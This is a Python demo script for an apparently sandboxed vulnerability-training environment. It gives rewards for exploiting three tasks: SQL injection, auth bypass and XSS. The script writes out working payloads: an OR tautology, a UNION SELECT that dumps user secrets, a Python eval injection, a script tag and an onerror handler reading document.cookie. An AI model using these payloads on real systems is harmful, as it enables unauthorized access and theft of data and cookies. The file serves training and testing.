"""
run_demo.py  –  End-to-end demonstration of all three vulnerability tasks.

Each task is run twice:
  1. Benign probe (partial/no reward)
  2. Successful exploit (full reward)

Run with:
    python run_demo.py
"""

import json
import sys
import time

sys.path.insert(0, __file__.rsplit("/", 1)[0])   # ensure local imports work

from env import VulnEnv


# ── Helpers ──────────────────────────────────────────────────────────────────

def _sep(label: str):
    print(f"\n{'─' * 60}")
    print(f"  {label}")
    print('─' * 60)


def _show_step(step_num: int, action: dict, obs: dict, reward: float, done: bool, info: dict):
    print(f"\n  Step {step_num}")
    print(f"    action  : {json.dumps(action)}")
    print(f"    output  : {str(obs.get('recent_output', ''))[:120]}")
    print(f"    reward  : {reward:.4f}")
    print(f"    done    : {done}")
    print(f"    exploit : {info['exploit_success']}")
    print(f"    partial : {info['partial_score']:.4f}")
    print(f"    alerts  : {obs['signals'].get('alerts', '')}")


# ── SQL Injection ─────────────────────────────────────────────────────────────

def demo_sql(env: VulnEnv):
    _sep("TASK: sql_injection")

    # -- Episode 1: benign probe --
    print("\n[Episode 1] Benign probe (no injection)")
    obs = env.reset("sql_injection")
    print(f"  code_context snippet:\n    {obs['code_context'].splitlines()[1]}")

    obs, r, done, info = env.step({"type": "input", "target": "query", "payload": "alice"})
    _show_step(1, {"type": "input", "target": "query", "payload": "alice"}, obs, r, done, info)

    # -- Episode 2: classic OR injection --
    print("\n[Episode 2] Classic OR injection")
    obs = env.reset("sql_injection")

    steps = [
        {"type": "input", "target": "query", "payload": "' OR '1'='1"},
    ]
    for i, action in enumerate(steps, 1):
        obs, r, done, info = env.step(action)
        _show_step(i, action, obs, r, done, info)
        if done:
            break

    # -- Episode 3: UNION-based injection --
    print("\n[Episode 3] UNION SELECT injection")
    obs = env.reset("sql_injection")
    action = {
        "type": "input",
        "target": "query",
        "payload": "' UNION SELECT id,username,role,secret FROM users--",
    }
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)


# ── Auth Bypass ───────────────────────────────────────────────────────────────

def demo_auth(env: VulnEnv):
    _sep("TASK: auth_bypass")

    # -- Episode 1: wrong password --
    print("\n[Episode 1] Wrong credentials (denied)")
    obs = env.reset("auth_bypass")

    action = {"type": "input", "target": "login", "payload": "admin"}
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)

    # -- Episode 2: eval injection --
    print("\n[Episode 2] Python eval injection")
    obs = env.reset("auth_bypass")

    action = {"type": "input", "target": "login", "payload": "') or True or ('"}
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)

    # -- Episode 3: multi-step (probe then exploit) --
    print("\n[Episode 3] Multi-step: probe → exploit")
    obs = env.reset("auth_bypass")

    steps = [
        {"type": "input", "target": "login", "payload": "alice"},          # valid user
        {"type": "input", "target": "login", "payload": "admin"},          # wrong pw → denied
        {"type": "input", "target": "login", "payload": "') or True or ('"}, # exploit
    ]
    for i, action in enumerate(steps, 1):
        obs, r, done, info = env.step(action)
        _show_step(i, action, obs, r, done, info)
        if done:
            break


# ── XSS Injection ─────────────────────────────────────────────────────────────

def demo_xss(env: VulnEnv):
    _sep("TASK: xss_injection")

    # -- Episode 1: plain input (no injection) --
    print("\n[Episode 1] Plain username (no injection)")
    obs = env.reset("xss_injection")

    action = {"type": "input", "target": "render", "payload": "alice::Hello world!"}
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)

    # -- Episode 2: HTML tag injection (partial) --
    print("\n[Episode 2] HTML tag injection (partial signal)")
    obs = env.reset("xss_injection")

    action = {"type": "input", "target": "render", "payload": "<b>alice</b>::<i>test</i>"}
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)

    # -- Episode 3: full XSS exploit --
    print("\n[Episode 3] Full XSS exploit (<script> injection)")
    obs = env.reset("xss_injection")

    steps = [
        # Step 1: probe the surface
        {"type": "input", "target": "render", "payload": "<b>probe</b>::test"},
        # Step 2: escalate to script injection
        {"type": "input", "target": "render",
         "payload": "<script>alert('xss')</script>::pwned"},
    ]
    for i, action in enumerate(steps, 1):
        obs, r, done, info = env.step(action)
        _show_step(i, action, obs, r, done, info)
        if done:
            break

    # -- Episode 4: event-handler XSS --
    print("\n[Episode 4] Event-handler XSS (onerror)")
    obs = env.reset("xss_injection")

    action = {
        "type": "input",
        "target": "render",
        "payload": "user::<img src=x onerror=alert(document.cookie)>",
    }
    obs, r, done, info = env.step(action)
    _show_step(1, action, obs, r, done, info)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    env = VulnEnv()
    print(f"Available tasks: {env.task_ids}\n")

    t0 = time.perf_counter()

    demo_sql(env)
    demo_auth(env)
    demo_xss(env)

    elapsed = time.perf_counter() - t0
    print(f"\n{'─'*60}")
    print(f"  All demos completed in {elapsed*1000:.1f} ms")
    print('─' * 60)


if __name__ == "__main__":
    main()
